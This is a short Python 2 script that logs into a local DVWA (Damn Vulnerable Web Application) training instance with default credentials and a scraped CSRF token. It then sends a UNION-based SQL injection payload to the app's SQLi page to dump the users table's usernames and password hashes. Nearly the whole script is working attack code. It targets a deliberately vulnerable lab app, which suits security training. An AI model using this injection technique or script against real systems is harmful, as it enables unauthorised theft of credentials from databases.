from bs4 import BeautifulSoup
import requests
import time

s = requests.Session()
def dvwa_login():
    url = "http://localhost/DVWA-master/login.php"
    result = s.get(url)
    usertoken = BeautifulSoup(result.text, 'html.parser').find('input', {'name':'user_token'}).get('value')
    payload={"username":"admin",
            "password":"password",
            "Login":"Login",
            "user_token":usertoken
            }
    result = s.post(url, data=payload)
    print "[+]Attempting to connect to DVWA server . . ."
    time.sleep(3)
    print "[+]Successfully connected to DVWA server . . ."
    time.sleep(1)

dvwa_login()
url = "http://localhost/DVWA-master/vulnerabilities/sqli/"
r = s.get(url)
payload = {"id":"1 = 1 union select user, password from users#",
           "Submit":"Submit"}
inject = s.post(url, data = payload)
soup = BeautifulSoup(inject.text, 'html.parser').find_all('pre')
print soup
